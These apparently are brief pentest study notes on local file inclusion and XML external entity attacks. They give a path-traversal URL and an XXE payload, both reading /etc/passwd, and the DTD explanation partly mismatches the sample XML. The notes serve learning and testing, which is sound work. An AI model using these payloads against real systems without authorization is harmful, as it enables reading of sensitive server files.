### LFI (local file inclusion)

If you see a parameter you can try LFI on it.
http://127.0.0.1/?file=page.php

We can not try view a file on the system.

http://127.0.0.1/?file=../../../../../../etc/passwd


### XXE (XML External Entity)

This abuses features of XML parser/Data.

Let's look at the structure.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE file SYSTEM "file.dtd">
<file>
    <to>moon</to>
    <from>cake</from>
    <heading>food</heading>
    <body>XXE attack</body>
</file> 
```
XML document starts with 

<?xml version="1.0" encoding="UTF-8"?> 

The next part is called the DTD (Document Type Definition)
This defines the elements and attributes.

- !DOCTYPE note -  Defines a root element of the document named note
- !ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
- !ELEMENT to - Defines the to element to be of type "#PCDATA"
- !ELEMENT from - Defines the from element to be of type "#PCDATA"
- !ELEMENT heading  - Defines the heading element to be of type "#PCDATA"
- !ELEMENT body - Defines the body element to be of type "#PCDATA"

We can abuse this to read a file on a system.
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```
